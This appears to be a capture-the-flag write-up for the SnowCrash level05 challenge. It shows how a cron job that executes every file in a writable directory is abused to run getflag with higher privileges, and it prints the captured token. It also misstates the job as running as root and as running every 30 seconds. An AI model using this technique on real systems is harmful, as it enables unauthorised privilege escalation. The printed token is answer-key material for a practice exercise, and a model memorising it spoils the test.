After enter level 05 I got a message on mail:
```shell
level05@192.168.56.101's password:
You have new mail.
level05@SnowCrash:~$
```
There is a cron job, running every 30 seconds and run the script as root:
```shell
level05@SnowCrash:~$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
Let's see the script:
```shell
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
It run all execute files in folder /opt/openarenaserver/, and delete them.
So I can put my bash script to execute from this folder as root.
```shell
level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /tmp/getflag.sh
level05@SnowCrash:~$ mv /tmp/getflag.sh /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/getflag.sh
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```


